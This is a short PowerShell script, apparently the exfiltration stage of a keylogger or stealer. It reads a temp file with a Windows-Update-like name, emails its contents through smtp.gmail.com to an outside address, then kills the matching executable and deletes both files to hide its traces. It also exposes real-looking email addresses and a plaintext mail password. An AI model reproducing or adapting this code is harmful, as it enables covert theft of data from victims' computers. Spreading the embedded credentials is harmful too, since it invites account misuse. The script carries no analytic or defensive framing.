$From = "pshs1235@gmail.com"
$To = "zacsengines@yahoo.com"
$Subject = "testing testing"
$Body = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")
$SMTPServer = "smtp.gmail.com"
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($From, "ixofwhfteeaiklik")
$SMTPClient.Send($From, $To, $Subject, $Body)
taskkill -f -im wsuA58F.exe
Remove-Item "$env:temp\wsuA58F.tmp"
Remove-Item "$env:temp\wsuA58F.exe"
